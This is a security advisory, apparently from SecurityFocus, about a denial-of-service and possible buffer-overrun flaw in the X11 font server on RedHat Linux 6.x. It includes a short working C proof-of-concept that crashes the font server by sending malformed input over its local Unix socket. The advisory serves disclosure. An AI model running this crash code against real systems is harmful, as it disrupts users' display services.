source: http://www.securityfocus.com/bid/1111/info

A denial of service exists in the X11 font server shipped with RedHat Linux 6.x. Due to improper input validation, it is possible for any user to crash the X fontserver. This will prevent the X server from functioning properly.

Additional, similar problems exist in the stock xfs. Users can crash the font server remotely, and potential exists for buffer overruns. The crux of the problem stems from the font server being lax about verifying network input. While no exploits exist, it is likely they are available in private circles, and can result in remote root compromise. 

#include <sys/socket.h>                                      
#include <sys/un.h>

#define CNT 50
#define FS "/tmp/.font-unix/fs-1"

int s,y;
struct sockaddr_un x;

char buf[CNT];

main() {
  for (y;y<2;y++) {
    s=socket(PF_UNIX,SOCK_STREAM,0);
    x.sun_family=AF_UNIX;
    strcpy(x.sun_path,FS);
    if (connect(s,&x,sizeof(x))) { perror(FS); exit(1); }
    if (!y) write(s,"lK",2);
    memset(buf,'A',CNT);
    write(s,buf,CNT);
    shutdown(s,2);
    close(s);
  } 
}   